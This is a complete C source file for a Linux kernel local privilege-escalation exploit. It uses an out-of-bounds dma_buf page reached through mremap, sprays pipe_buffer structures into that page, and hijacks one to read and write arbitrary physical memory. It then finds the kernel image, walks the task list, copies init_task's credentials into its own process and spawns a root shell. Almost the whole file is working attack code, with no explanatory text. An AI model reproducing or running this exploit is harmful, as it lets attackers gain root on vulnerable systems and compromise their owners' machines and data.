#define _GNU_SOURCE
#include <assert.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/io.h>
#include <sys/mman.h>
#include <unistd.h>

#include "pipe_fds_t.h"
#include "pipe_buffer.h"
#include "util.h"
#include "kernel_constants.h"
#include "dma_buf_t.h"

#define NUM_SPRAY_BUF_PAGES (8)
#define NUM_VICTIM_BUF_PAGES (NUM_SPRAY_BUF_PAGES/2 + 1)
#define NUM_FILL_PAGES (NUM_VICTIM_BUF_PAGES + 20)

#define NUM_SPRAYS (50)
#define NUM_SPRAY_BUFFERS (50)
#define NUM_SPRAY_PIPES (400) // will spray pipe_buffer into 50 pages

#define PHYSICAL_MEMORY (2ull << 30)

// kmalloc-rcl-512 is the largest cache with pagesperslab=1
#define SIZE_OF_PIPE_BUFFER_PADDED ((sizeof(pipe_buffer) + 7)/8*8)
#define NUM_PIPE_BUFFERS_PER_SPRAY_PIPE (256 / SIZE_OF_PIPE_BUFFER_PADDED)

dma_buf_t *spray_buffers[NUM_SPRAY_BUFFERS] = {0};
pipe_fds_t spray_pipes[NUM_SPRAY_PIPES] = {0};

intptr_t kernel_base = 0;
intptr_t kernel_base_phys = 0;
intptr_t phys_base = 0;
intptr_t page_offset_base = 0;
intptr_t vmemmap_base = 0;
intptr_t vmalloc_base = 0;

pipe_buffer *target_pipe_buffer = NULL;
pipe_fds_t *target_pipe_fds = NULL;

pipe_buffer target_pipe_buffer_backup;

void init_spray_pipes()
{
    for (size_t i=0; i<NUM_SPRAY_PIPES; i++){
        init_pipe_fds(&spray_pipes[i]);
        resize_pipe(&spray_pipes[i], 1);
    }
}

void destroy_spray_pipes()
{
    for (size_t i=0; i<NUM_SPRAY_PIPES; i++)
        destroy_pipe_fds(&spray_pipes[i]);
}

void spray_pipe_buffers()
{
    for (size_t i=0; i<NUM_SPRAY_PIPES; i++)
        resize_pipe(&spray_pipes[i], NUM_PIPE_BUFFERS_PER_SPRAY_PIPE);
}

void do_spray_dma_bufs()
{
    for (int i=0; i<NUM_SPRAYS; i++) {
        for (int j=0; j<NUM_SPRAY_BUFFERS; j++) {
            spray_buffers[j] = create_dma_buf(NUM_SPRAY_BUF_PAGES*PAGE_SIZE);
            if (!spray_buffers[j]) {
                panic("[-] could not create spray buffers.");
            }
        }

        for (int j=0; j<NUM_SPRAY_BUFFERS; j++) {
            close(spray_buffers[j]->buf_fd);
            free(spray_buffers[j]);
        }
    }
}

void fault_page(char *addr)
{
    char dummy = *(volatile char *)addr;
}

bool is_pipe_buffer(pipe_buffer *candidate)
{
    intptr_t mask = PAGE_SIZE-1;
    if ( (((intptr_t)candidate->ops)&mask) != (ADDR_ANON_PIPE_BUF_OPS&mask) )
        return false;

    printf("[+] found anon_pipe_buf_ops @ %p\n", candidate->ops);

    if (candidate->page == 0 || candidate->len != 8 || candidate->offset != 0)
        return false;

    return true;
}

size_t round_up_to_power_of_2(size_t length) {
    if (length*2 < length)
        panic("[-] parameter length too large.");

    int power = 1;
    while(power < length)
        power*=2;
    return power;
}

pipe_buffer *find_target_pipe_buffer(void *uaf_page_addr) {
    size_t step_size = round_up_to_power_of_2(sizeof(pipe_buffer));

    for (pipe_buffer *candidate = (pipe_buffer *)uaf_page_addr; 
         (void*)candidate < (uaf_page_addr+PAGE_SIZE-sizeof(pipe_buffer)); 
         candidate = ((void *)candidate)+step_size) {

        if (is_pipe_buffer(candidate))
            return candidate;
    }

    return NULL;
}

intptr_t page_address_from_idx(size_t page_idx)
{
    return vmemmap_base + page_idx * SIZEOF_PAGE_STRUCT;
}

intptr_t page_address_from_phys(intptr_t physical_address)
{
    return page_address_from_idx(physical_address >> PAGE_SHIFT);
}

void arbitrary_read(intptr_t addr, char *buf, size_t len)
{
    size_t page_offset = (intptr_t)addr & INV_PAGE_MASK;
    if (page_offset+len > PAGE_SIZE)
        panic("Can't read over page boundary.");

    target_pipe_buffer->offset = page_offset;
    target_pipe_buffer->len = -1;
    target_pipe_buffer->page = page_address_from_phys(addr);

    // TODO: calculate the correct page number from virtual?

    read(target_pipe_fds->read_fd, buf, len);
}

void arbitrary_write(intptr_t addr, char *buf, size_t len)
{
    size_t page_offset = (intptr_t)addr & INV_PAGE_MASK;
    if (page_offset+len > PAGE_SIZE)
        panic("Can't write over page boundary.");

    target_pipe_buffer->offset = page_offset;
    target_pipe_buffer->len = 0;
    target_pipe_buffer->page = page_address_from_phys(addr);

    // TODO: calculate the correct page number from virtual?

    write(target_pipe_fds->write_fd, buf, len);
}

#define DEFINE_ARBITRARY_RW(TYPE, NAME)                                     \
    TYPE arbitrary_read_##NAME(intptr_t addr) {                             \
        TYPE value;                                                         \
        arbitrary_read(addr, (char*)&value, sizeof(TYPE));                         \
        return value;                                                       \
    }                                                                       \
                                                                            \
    void arbitrary_write_##NAME(intptr_t addr, TYPE value) {                \
        arbitrary_write(addr, (char*)&value, sizeof(TYPE));                        \
    }

DEFINE_ARBITRARY_RW(uint64_t, qword)
DEFINE_ARBITRARY_RW(uint32_t, dword)
DEFINE_ARBITRARY_RW(int, int)

intptr_t kernel_ptr_to_phys(intptr_t addr)
{
    return addr - kernel_base + kernel_base_phys;
}

intptr_t heap_ptr_to_phys(intptr_t addr)
{
    // return (addr & 0xffffffffull) + 0x100000000ull;
    return addr - page_offset_base;
}

intptr_t find_kernel_phys_base()
{
    for (intptr_t candidate = 0; candidate < PHYSICAL_MEMORY; candidate += MIN_KERNEL_ALIGN) {
        if (arbitrary_read_qword(candidate + TEXT_SEGMENT_START) == KERNEL_IMAGE_FIRST_QWORD) {
            return candidate;
        }
    }
    return 0;
}

void spawn_shell()
{
  char* argv[] = { "/bin/sh", NULL };
  if (execve("/bin/sh", argv, NULL) == -1)
    panic("[-] could not execve");
}

int main(int argc, char* argv[])
{
    pipe_fds_t fill_pipe;
    printf("[+] creating fill pipe\n");
    init_pipe_fds(&fill_pipe);
    resize_pipe(&fill_pipe, PIPE_MAX_PAGES);

    printf("[+] creating empty spray pipes\n");
    init_spray_pipes();

    printf("[+] allocating %d pages in fill pipe\n", PIPE_MAX_PAGES);
    alloc_pipe_pages(&fill_pipe, PIPE_MAX_PAGES);

    printf("[+] spraying dma bufs with %d pages\n", NUM_SPRAY_BUF_PAGES);
    do_spray_dma_bufs();

    printf("[+] freeing %d pages from pipe\n", NUM_FILL_PAGES);
    free_pipe_pages(&fill_pipe, NUM_FILL_PAGES);

    printf("[+] creating dma buf with %d pages\n", NUM_VICTIM_BUF_PAGES);
    dma_buf_t *dma_buf = create_dma_buf(NUM_VICTIM_BUF_PAGES*PAGE_SIZE);

    printf("[+] spraying pipe buffers\n");
    spray_pipe_buffers();

    printf("[+] mapping dma buf\n");
    void* mmapped_addr = mmap(NULL, dma_buf->size,
        PROT_READ|PROT_WRITE, MAP_SHARED, dma_buf->buf_fd, 0);
    if (mmapped_addr == MAP_FAILED)
        panic("[-] couldn't map memory");

    printf("[+] expanding dma buf by one page\n");
    void *remapped_addr = mremap(mmapped_addr, dma_buf->size, dma_buf->size+PAGE_SIZE, MREMAP_MAYMOVE);
    if(remapped_addr==MAP_FAILED)
        panic("[-] couldn't mremap memory");

    char *uaf_page_addr = remapped_addr+dma_buf->size;

    printf("[+] accessing OOB page\n");
    fault_page(uaf_page_addr);

    printf("[+] beginning of OOB page:\n");
    hexdump(uaf_page_addr, 0x100);

    printf("[+] writing to spray pipes\n");
    
    for (int i=0; i<NUM_SPRAY_PIPES; i++) {
        pipe_write_qword(&spray_pipes[i], 0xaaaaaaaaaaaaaaaa);

        if (target_pipe_buffer = find_target_pipe_buffer(uaf_page_addr))
        {
            target_pipe_fds = &spray_pipes[i];
            break;
        }
    }

    if (!target_pipe_buffer) {
        printf("[-] no pipe_buffer was sprayed into UAF page\n");
        goto out1;
    }

    target_pipe_buffer_backup = *target_pipe_buffer;

    print_pipe_buffer("target_pipe_buffer", target_pipe_buffer);

    vmemmap_base = (intptr_t)target_pipe_buffer->page & 0xfffffffff0000000;
    printf("[+] vmemmap_base = %p\n", vmemmap_base);
    
    kernel_base = target_pipe_buffer->ops - ADDR_ANON_PIPE_BUF_OPS;
    printf("[+] kernel_base = %p\n", kernel_base);

    // Somewhere after this point the exploit corrupts the kernel.
    printf("[+] Trying to find kernel image in physical memory\n");
    if (!(kernel_base_phys = find_kernel_phys_base())) {
        printf("[-] Could not find kernel image\n");
        goto out;
    }
    printf("[+] Found kernel image at physical address %p\n", kernel_base_phys);
    
    page_offset_base = arbitrary_read_qword(kernel_base_phys + ADDR_PAGE_OFFSET_BASE);
    printf("[+] page_offset_base = %p\n", page_offset_base);
    vmalloc_base = arbitrary_read_qword(kernel_base_phys + ADDR_VMALLOC_BASE);
    printf("[+] vmalloc_base = %p\n", vmalloc_base);
    if (vmemmap_base != arbitrary_read_qword(kernel_base_phys + ADDR_VMEMMAP_BASE))
        panic("[-] expected value for vmemmap_base");

    printf("[+] phys_base = %p\n", arbitrary_read_qword(kernel_base_phys + ADDR_PHYS_BASE));
    printf("[+] kernel_base_phys = %p\n", kernel_base_phys);

    char buf[0x40];
    arbitrary_read(kernel_base_phys + ADDR_INIT_TASK + OFFSET_COMM_IN_TASK_STRUCT, buf, 0x40);
    printf("[+] init_task->comm = \"%s\"\n", buf);

    printf(
        "[+] init_task->pid = %d\n", 
        arbitrary_read_int(kernel_base_phys + ADDR_INIT_TASK + OFFSET_PID_IN_TASK_STRUCT)
    );

    printf("[+] init_task->tasks->next = %p\n", arbitrary_read_qword(
        kernel_base_phys + ADDR_INIT_TASK + OFFSET_TASKS_IN_TASK_STRUCT + OFFSET_NEXT_IN_LIST_HEAD
    ));

    printf("[+] init_task->tasks->prev = %p\n", arbitrary_read_qword(
        kernel_base_phys + ADDR_INIT_TASK + OFFSET_TASKS_IN_TASK_STRUCT + OFFSET_PREV_IN_LIST_HEAD
    ));

    intptr_t root_cred = arbitrary_read_qword(
        kernel_base_phys + ADDR_INIT_TASK + OFFSET_CRED_IN_TASK_STRUCT
    );

    intptr_t root_real_cred = arbitrary_read_qword(
        kernel_base_phys + ADDR_INIT_TASK + OFFSET_REAL_CRED_IN_TASK_STRUCT
    );

    intptr_t task = arbitrary_read_qword(
        kernel_base_phys + ADDR_INIT_TASK + OFFSET_TASKS_IN_TASK_STRUCT + OFFSET_PREV_IN_LIST_HEAD
    ) - OFFSET_TASKS_IN_TASK_STRUCT;
    
    pid_t our_pid = getpid();
    printf("[+] our_pid = %d\n", our_pid);
    while (1) {
        printf("[+] task = %p\n", task);

        arbitrary_read(
            heap_ptr_to_phys(task + OFFSET_COMM_IN_TASK_STRUCT),
            buf, 
            0x40
        );
        printf("[+] task->comm = \"%s\"\n", buf);

        pid_t task_pid = arbitrary_read_int(
            heap_ptr_to_phys(task + OFFSET_PID_IN_TASK_STRUCT)
        );
        printf("[+] task->pid = %d\n", task_pid);

        if (task_pid == our_pid) {
            printf("[+] Found our own task_struct\n");
            break;
        }

        printf("[+] task->tasks->next = %p\n", arbitrary_read_qword(
            heap_ptr_to_phys(task + OFFSET_TASKS_IN_TASK_STRUCT + OFFSET_NEXT_IN_LIST_HEAD)       
        ));

        printf("[+] task->tasks->prev = %p\n", arbitrary_read_qword(
            heap_ptr_to_phys(task + OFFSET_TASKS_IN_TASK_STRUCT + OFFSET_PREV_IN_LIST_HEAD)   
        ));

        intptr_t next_task = arbitrary_read_qword(
            heap_ptr_to_phys(task + OFFSET_TASKS_IN_TASK_STRUCT + OFFSET_PREV_IN_LIST_HEAD)
        ) - OFFSET_TASKS_IN_TASK_STRUCT;

        if (next_task == task) {
            printf("[-] Did not find our own task in task list\n");
            goto out;
        }

        task = next_task;
    }

    printf("[+] current creds: ");
    fflush(stdout);
    system("id");

    printf("[+] overwriting our creds with root creds\n");
    arbitrary_write_qword(
        heap_ptr_to_phys(task + OFFSET_CRED_IN_TASK_STRUCT),
        root_cred
    );
    arbitrary_write_qword(
        heap_ptr_to_phys(task + OFFSET_REAL_CRED_IN_TASK_STRUCT),
        root_real_cred
    );

    printf("[+] new creds: ");
    fflush(stdout);
    system("id");

    printf("[+] spawning root shell\n");
    spawn_shell();

out:
    printf("[ ] restoring the state of target_pipe_buffer\n");
    target_pipe_buffer_backup = *target_pipe_buffer;    

out1:
    printf("[ ] freeing OOB page with MADV_DONTNEED\n");
    madvise(uaf_page_addr, PAGE_SIZE, MADV_DONTNEED);

    printf("[ ] closing dma_buf\n");
    free_dma_buf(dma_buf);

    printf("[ ] closing spray pipes\n");
    destroy_spray_pipes();

    printf("[ ] destroying fill pipe\n");
    destroy_pipe_fds(&fill_pipe);

    return 0;
}